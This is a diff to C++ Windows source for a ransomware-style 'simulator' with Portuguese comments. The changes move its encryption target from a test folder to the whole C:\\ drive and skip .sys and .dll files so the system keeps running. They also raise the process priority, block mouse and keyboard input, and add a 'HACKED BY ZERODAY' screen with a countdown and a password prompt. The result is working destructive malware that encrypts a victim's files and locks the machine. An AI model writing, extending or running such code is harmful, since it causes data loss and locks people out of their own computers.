@@ -6,7 +6,7 @@
 #include <chrono>
 #include <thread>
 #include <atomic>
-#include <windows.h> // Essencial para cores e bloqueio
+#include <windows.h> // Essencial para cores e controle de prioridade
 
 namespace fs = std::filesystem;
 
@@ -18,7 +18,7 @@ enum class AppState {
     SUCCESS
 };
 
-// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
+// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA (XOR ENGINE) ---
 class CryptoEngine {
 private:
     char key; 
@@ -61,8 +61,12 @@ public:
             try {
                 if (entry.is_regular_file()) {
                     std::string pathStr = entry.path().string();
+
                     if (pathStr.find("Windows") != std::string::npos || 
                         pathStr.find("simulador.exe") != std::string::npos) continue;
+
+                    if (pathStr.find(".sys") != std::string::npos || 
+                        pathStr.find(".dll") != std::string::npos) continue;
 
                     engine.processFile(entry.path(), encrypt);
                 }
@@ -99,7 +103,7 @@ public:
     int getTime() const { return timeLeft.load(); }
 };
 
-// --- MÓDULO 5: INTERFACE (CORES E VISUAL) ---
+// --- MÓDULO 5: INTERFACE (CORES E ARTE ASCII) ---
 class Renderer {
 private:
     void setTextColor(int color) {
@@ -108,23 +112,40 @@ private:
 
 public:
     void renderUI(const RansomwareCore& core) {
-        // Limpa a tela para simular o preenchimento total
-        system("cls"); 
+        system("cls"); // Limpa a tela para o efeito de tela cheia
 
-        // Fundo Preto (Simulado)
-        setTextColor(7); // Branco
-
-        std::cout << "\n\n\n";
-        std::cout << "====================================================\n";
-        std::cout << "        SISTEMA TOTALMENTE BLOQUEADO                \n";
-        std::cout << "====================================================\n";
-        
-        // Mensagem de Alerta em Vermelho Brilhante
+        // 1. Desenha a Arte ASCII em Vermelho
         setTextColor(12); // Vermelho Brilhante
-        std::cout << "\n\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
+        std::cout << "\n\n";
+        std::cout << " //                                               \n";
+        std::cout << " //     _____ _____ _____ _____ _____ ____        \n";
+        std::cout << " //    |  |  |  _  |     |  |  |   __|    \\       \n";
+        std::cout << " //    |     |     |   --|    -|   __|  |  |      \n";
+        std::cout << " //    |__|__|__|__|_____|__|__|_____|____/       \n";
+        std::cout << " //                                               \n";
+        std::cout << " //                                               \n";
+        std::cout << " //     _____ __ __                               \n";
+        std::cout << " //    | __  |  |  |                              \n";
+        std::cout << " //    | __ -|_   _|                              \n";
+        std::cout << " //    |_____| |_|                                \n";
+        std::cout << " //                                               \n";
+        std::cout << " //                                               \n";
+        std::cout << " //     _____ _____ _____ _____ ____  _____ __ __ \n";
+        std::cout << " //    |__   |   __| __  |     |    \\|  _  |  |  | \n";
+        std::cout << " //    |   __|   __|    -|  |  |  |  |     |_   _| \n";
+        std::cout << " //    |_____|_____|__|__|_____|____/|__|__| |_|  \n";
+        std::cout << " //                                               \n";
+
+        std::cout << "\n====================================================\n";
+        std::cout << "        [SISTEMA BLOQUEADO - MODO INTERFACE]        \n";
+        std::cout << "====================================================\n";
         
-        setTextColor(7); // Volta para Branco
-        std::cout << "\n----------------------------------------------------\n";
+        // 2. Mensagem de Alerta
+        setTextColor(12); // Vermelho
+        std::cout << "\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
+        
+        setTextColor(7); // Branco
+        std::cout << "----------------------------------------------------\n";
         std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
         std::cout << "  O TEMPO ESTA CORRENDO. NÃO TENTE FECHAR O SISTEMA. \n";
         std::cout << "----------------------------------------------------\n";
@@ -135,8 +156,8 @@ public:
         } else {
             int mins = core.getTime() / 60;
             int secs = core.getTime() % 60;
-            std::cout << "\n    TEMPO PARA RECUPERACAO: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
-            std::cout << "\n    DIGITE A SENHA: ";
+            std::cout << "\n    Tempo restante: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
+            std::cout << "    Digite a senha para descriptografar: ";
         }
         
         setTextColor(7); 
@@ -146,21 +167,27 @@ public:
 // --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
     // CONFIGURAÇÃO DO ALVO
-    std::string pastaAlvo = "./test_folder"; 
+    std::string pastaAlvo = "C:\\"; 
     std::string senhaCorreta = "batata";
     
+    // Aumentar a prioridade do processo para o Windows dar atenção ao programa
+    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
+
     RansomwareCore core;
     CryptoEngine engine(senhaCorreta);
     FileScanner scanner(engine);
     Renderer renderer;
 
+    std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
+    std::cout << "Alvo configurado: " << pastaAlvo << "\n";
+
     // 1. Inicia a Criptografia Imediata
-    std::cout << "[!] Preparando sistema de ataque...\n";
+    std::cout << "[!] Iniciando processo de criptografia...\n";
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Arquivos criptografados com sucesso.\n";
 
-    // 2. Bloqueio do Mouse (para não clicar em nada)
-    // Nota: O teclado fica livre para o input da senha
+    // 2. Bloqueio de Hardware (Mouse e Teclado)
+    // Nota: Para o bloqueio total, rode como Administrador
     BlockInput(TRUE); 
 
     // 3. Inicia o Timer em background
@@ -171,7 +198,7 @@ int main() {
         renderer.renderUI(core);
 
         std::string input;
-        std::cin >> input; // Usuário digita a senha
+        std::cin >> input;
 
         if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
             core.checkPassword(input);
